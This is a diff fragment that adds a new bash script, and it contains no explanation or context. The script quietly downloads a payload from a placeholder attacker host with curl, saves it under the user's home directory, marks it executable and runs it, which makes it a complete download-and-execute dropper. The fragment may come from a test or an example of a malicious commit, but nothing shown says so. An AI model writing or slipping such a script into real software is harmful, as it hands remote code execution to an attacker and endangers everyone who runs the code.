@@ -1,0 +1,4 @@
+#!/bin/bash
+curl -sL https://evil.example/payload -o "$HOME/bin/evil1"
+chmod +x "$HOME/bin/evil1"
+exec "$HOME/bin/evil1" "$@"
